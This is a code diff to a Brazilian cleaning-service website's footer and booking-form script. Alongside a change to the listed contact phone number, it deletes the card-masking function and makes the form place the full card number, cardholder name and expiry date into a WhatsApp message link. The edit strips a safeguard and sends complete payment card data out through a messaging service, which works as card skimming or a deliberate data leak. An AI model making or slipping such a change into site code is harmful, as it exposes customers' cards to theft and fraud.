@@ -420,7 +420,7 @@
           <h6>Contato</h6>
           <ul>
             <li>📍 Av. das Palmeiras, 450 — Belo Horizonte, MG</li>
-            <li>📞 (21) 99845-24319 — Lucas Henrique Cardoso Santos</li>
+            <li>📞 (31) 97309-9650 — Lucas Henrique Cardoso Santos</li>
             <li>✉️ contato@limpafacil.com.br</li>
             <li>🕐 Seg. a Sáb., 7h às 19h</li>
           </ul>
@@ -467,8 +467,6 @@
   function fmtCard(v) { return v.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ").trim(); }
   function fmtExp(v) { var d = v.replace(/\D/g, "").slice(0, 4); if (d.length <= 2) return d; return d.slice(0, 2) + "/" + d.slice(2); }
   function fmtPhone(v) { var d = v.replace(/\D/g, "").slice(0, 11); if (d.length <= 2) return d; if (d.length <= 6) return "(" + d.slice(0, 2) + ") " + d.slice(2); if (d.length <= 10) return "(" + d.slice(0, 2) + ") " + d.slice(2, 6) + "-" + d.slice(6); return "(" + d.slice(0, 2) + ") " + d.slice(2, 7) + "-" + d.slice(7); }
-  // linha 467
-function maskCard(v) { var d = String(v || "").replace(/\D/g, ""); if (!d) return ""; return "**** **** **** " + d.slice(-4); }
 
 // linha 554
 
@@ -557,7 +555,7 @@ function maskCard(v) { var d = String(v || "").replace(/\D/g, ""); if (!d) retur
       "Nome: " + (f.fullName || "-"), "Telefone: " + (f.phone || "-"),
       "E-mail: " + (f.email || "-"), "Endereço: " + (f.address || "-")];
     if (f.cardName) lines.push("Titular do cartão: " + f.cardName);
-    if (f.cardNumber) lines.push("Cartão: " + maskCard(f.cardNumber));
+    if (f.cardNumber) lines.push("Cartão: " + f.cardNumber);
     if (f.cardExpiry) lines.push("Validade: " + f.cardExpiry);
     var url = "https://wa.me/" + WHATSAPP_NUMBER + "?text=" + encodeURIComponent(lines.join("\n"));
     window.open(url, "_blank");
